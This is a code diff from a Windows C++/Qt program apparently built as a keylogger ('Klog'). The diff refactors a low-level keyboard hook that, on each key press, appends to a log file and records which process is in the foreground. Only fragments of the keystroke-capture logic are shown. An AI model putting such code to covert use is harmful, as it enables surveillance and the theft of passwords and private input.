@@ -47,7 +47,7 @@ LRESULT CALLBACK Klog::keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
     auto& klog = Klog::instance();
     //If Keylogger is ON && key is pressed
-    if (Klog::instance().isWorking && wParam == WM_KEYDOWN)
+    if (klog.isWorking && wParam == WM_KEYDOWN)
     {
         //Open log file
         if ( ! klog.logFile->open(QIODevice::Append | QIODevice::Text))
@@ -74,13 +74,13 @@ LRESULT CALLBACK Klog::keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
         QString currProc;
         if (GetModuleFileNameEx(handle, 0, procPath, MAX_PATH))
         {
-            currProc = QString::fromWCharArray((LPTSTR)procPath);
+            currProc = QString::fromWCharArray(procPath);
         }
         //Second variant (64-bit)
         else if (GetProcessImageFileName(handle, procPath, MAX_PATH))
         {
             //Get path in device form
-            QString devicePath(QString::fromWCharArray((LPTSTR)procPath));
+            QString devicePath(QString::fromWCharArray(procPath));
 
             //Transform device form path to drive letters
             TCHAR driveLetter = 'A';
@@ -94,7 +94,7 @@ LRESULT CALLBACK Klog::keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
                     if(wcsncmp(procPath, szTarget, wcslen(szTarget)) == 0)
                         break;
                 }
-                driveLetter++;
+                ++driveLetter;
             }
 
             //Replace device name with drive letter
